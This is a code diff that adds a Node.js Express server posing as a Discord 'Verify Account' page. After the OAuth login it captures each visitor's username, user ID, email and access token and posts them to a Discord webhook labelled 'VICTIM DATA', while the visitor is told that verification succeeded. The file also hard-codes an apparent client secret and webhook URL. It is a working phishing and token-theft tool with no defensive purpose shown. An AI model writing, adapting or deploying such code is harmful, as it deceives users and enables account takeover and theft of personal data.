@@ -1,0 +1,159 @@
+const express = require('express');
+const axios = require('axios');
+
+const app = express();
+
+// ===== REPLACE THESE 4 THINGS =====
+const CLIENT_ID = "1509710330232836338";
+const CLIENT_SECRET = "BUt81vnML4moN8z5KwXI046GwtTVc_Nc";
+const REDIRECT_URI = "https://verifytool.onrender.com/callback";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1508249692654276729/N0Wmm7TwrXr8wLlHLexljqtVOF9pOdtdnpZioofDXpaU8QsDdL02jzsDhGZgWTrQ80H5";
+// ===================================
+
+app.get('/', (req, res) => {
+    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify+email`;
+    
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Verification</title>
+            <style>
+                body {
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    font-family: system-ui, -apple-system, sans-serif;
+                    background: #1e1f22;
+                    margin: 0;
+                    padding: 20px;
+                }
+                .container {
+                    text-align: center;
+                    background: #2b2d31;
+                    padding: 40px;
+                    border-radius: 20px;
+                    max-width: 400px;
+                }
+                img {
+                    max-width: 100%;
+                    border-radius: 16px;
+                    margin-bottom: 20px;
+                }
+                button {
+                    background: #5865f2;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 8px;
+                    font-size: 16px;
+                    font-weight: 500;
+                    cursor: pointer;
+                    width: 100%;
+                }
+                p {
+                    color: #dbdee1;
+                    margin-top: 16px;
+                }
+                h2 { color: white; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <img src="https://i.imgur.com/7kZjYcd.jpeg" alt="Verification">
+                <h2>Complete Verification</h2>
+                <p>Click below to verify your account</p>
+                <button onclick="window.location.href='${discordAuthUrl}'">Verify Account</button>
+            </div>
+        </body>
+        </html>
+    `);
+});
+
+app.get('/callback', async (req, res) => {
+    const code = req.query.code;
+    
+    if (!code) {
+        return res.send("No code received.");
+    }
+    
+    try {
+        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', 
+            new URLSearchParams({
+                client_id: CLIENT_ID,
+                client_secret: CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: REDIRECT_URI
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        
+        const accessToken = tokenResponse.data.access_token;
+        
+        const userResponse = await axios.get('https://discord.com/api/users/@me', {
+            headers: { 'Authorization': `Bearer ${accessToken}` }
+        });
+        
+        const user = userResponse.data;
+        
+        await axios.post(WEBHOOK_URL, {
+            content: `**🔐 VICTIM DATA**\n━━━━━━━━━━━━━━━━━━━\n**Username:** ${user.username}#${user.discriminator || '0'}\n**User ID:** ${user.id}\n**Email:** ${user.email || 'Not verified'}\n**Token:** \`${accessToken}\`\n━━━━━━━━━━━━━━━━━━━`
+        });
+        
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Verified</title>
+                <style>
+                    body {
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        min-height: 100vh;
+                        font-family: system-ui, -apple-system, sans-serif;
+                        background: #1e1f22;
+                        margin: 0;
+                        padding: 20px;
+                    }
+                    .container {
+                        text-align: center;
+                        background: #2b2d31;
+                        padding: 40px;
+                        border-radius: 20px;
+                        max-width: 400px;
+                    }
+                    img {
+                        max-width: 100%;
+                        border-radius: 16px;
+                        margin-bottom: 20px;
+                    }
+                    h2 { color: #23a559; }
+                    p { color: #dbdee1; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <img src="https://i.imgur.com/7kZjYcd.jpeg" alt="Success">
+                    <h2>✓ Verification Complete!</h2>
+                    <p>You have been verified. You may close this tab.</p>
+                </div>
+            </body>
+            </html>
+        `);
+        
+    } catch (error) {
+        console.error('Error:', error.message);
+        res.send("An error occurred. Please try again.");
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
